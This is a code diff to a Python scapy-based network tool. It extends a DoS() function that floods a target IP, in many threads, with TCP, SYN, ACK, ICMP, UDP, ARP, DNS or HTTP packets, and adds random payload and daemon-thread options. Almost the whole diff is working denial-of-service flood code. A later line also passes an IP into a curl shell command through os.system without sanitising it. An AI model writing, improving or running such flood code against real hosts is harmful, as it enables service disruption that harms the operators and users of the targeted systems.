@@ -1,6 +1,8 @@
 import os
 import sys
 import threading
+import string
+import random
 
 try:
     from scapy.layers.dns import DNS
@@ -164,6 +166,7 @@ def setDstPort():
 
 
 def IPtoDNS():
+    global targetIP, addrs
     try:
         addrs = dns.reversename.from_address(targetIP)
         print("Address: " + str(addrs))
@@ -204,13 +207,18 @@ def DoS():
     print(protocols)
     while True:
         mode = input("{?} Protocol: ")
-        b = input("{?} Bytes: ")
+        b = input("{?} Bytes ( the text you will give will be encoded in UTF-8 format ) ( press enter for NULL bytes ) : ")
         way = input(f"[?] {targetIP} IPv4 / IPv6 (4 or 6): ")
-        if mode != "" and b != "" and way != "":
+        random_bytes = input("{?} Random Bytes ( Y/N ): ")
+        daemon_threads = input("{?} Daemon Threads ( Y/N ): ")
+        if mode != "" and way != "" and random_bytes != "" and daemon_threads != "":
             try:
                 mode = int(mode)
-                b = b.encode("utf-8")
+                if b != "":
+                    b = b.encode("utf-8")
                 way = int(way)
+                random_bytes = True if random_bytes.lower() in ["y", "yes"] else False
+                daemon_threads = True if daemon_threads.lower() in ["y", "yes"] else False
             except Exception as e:
                 print(e)
                 continue
@@ -232,52 +240,116 @@ def DoS():
     packetSize = Raw(load=b)
 
     if mode == 1:
-        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
-        if threads is not None:
+        if b == "":
+            tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort)
+        else:
+            tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[tcp]).start()
+                if random_bytes:
+                    if b == "":
+                        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort)
+                    else:
+                        tcp = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort) / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[tcp], daemon=daemon_threads).start()
 
     elif mode == 2:
-        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
-        if threads is not None:
+        if b == "":
+            tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S')
+        else:
+            tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[tcpSYN]).start()
+                if random_bytes:
+                    if b == "":
+                        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S')
+                    else:
+                        tcpSYN = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[tcpSYN], daemon=daemon_threads).start()
 
     elif mode == 3:
-        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
-        if threads is not None:
+        if b == "":
+            tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A')
+        else:
+            tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[tcpACK]).start()
+                if random_bytes:
+                    if b == "":
+                        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A')
+                    else:
+                        tcpACK = etherPacket / ipPacket / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[tcpACK], daemon=daemon_threads).start()
 
     elif mode == 4:
-        icmp = etherPacket / ipPacket / ICMP() / packetSize
-        if threads is not None:
+        if b == "":
+            icmp = etherPacket / ipPacket / ICMP()
+        else:
+            icmp = etherPacket / ipPacket / ICMP() / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[icmp]).start()
+                if random_bytes:
+                    if b == "":
+                        icmp = etherPacket / ipPacket / ICMP()
+                    else:
+                        icmp = etherPacket / ipPacket / ICMP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[icmp], daemon=daemon_threads).start()
 
     elif mode == 5:
-        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
-        if threads is not None:
+        if b == "":
+            udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort)
+        else:
+            udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[udp]).start()
+                if random_bytes:
+                    if b == "":
+                        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort)
+                    else:
+                        udp = etherPacket / ipPacket / UDP(dport=dstPort, sport=srcPort) / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[udp], daemon=daemon_threads).start()
 
     elif mode == 6:
-        arp = etherPacket / ipPacket / ARP() / packetSize
-        if threads is not None:
+        if b == "":
+            arp = etherPacket / ipPacket / ARP()
+        else:
+            arp = etherPacket / ipPacket / ARP() / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[arp]).start()
+                if random_bytes:
+                    if b == "":
+                        arp = etherPacket / ipPacket / ARP()
+                    else:
+                        arp = etherPacket / ipPacket / ARP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[arp], daemon=daemon_threads).start()
 
     elif mode == 7:
-        dns = etherPacket / ipPacket / DNS() / packetSize
-        if threads is not None:
+        if b == "":
+            dns = etherPacket / ipPacket / DNS()
+        else:
+            dns = etherPacket / ipPacket / DNS() / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[dns]).start()
+                if random_bytes:
+                    if b == "":
+                        dns = etherPacket / ipPacket / DNS()
+                    else:
+                        dns = etherPacket / ipPacket / DNS() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[dns], daemon=daemon_threads).start()
 
     elif mode == 8:
-        http = etherPacket / ipPacket / HTTP() / packetSize
-        if threads is not None:
+        if b == "":
+            http = etherPacket / ipPacket / HTTP()
+        else:
+            http = etherPacket / ipPacket / HTTP() / packetSize
+        if threads:
             for t in range(threads):
-                threading.Thread(target=attack, args=[http]).start()
+                if random_bytes:
+                    if b == "":
+                        http = etherPacket / ipPacket / HTTP()
+                    else:
+                        http = etherPacket / ipPacket / HTTP() / Raw(load=''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1,100))))
+                threading.Thread(target=attack, args=[http], daemon=daemon_threads).start()
 
     elif mode == 9:
         if way == 4:
@@ -405,5 +477,3 @@ while True:
             os.system("curl https://ipwhois.app/json/" + ip)
     else:
         print("Only numbers")
-
-        
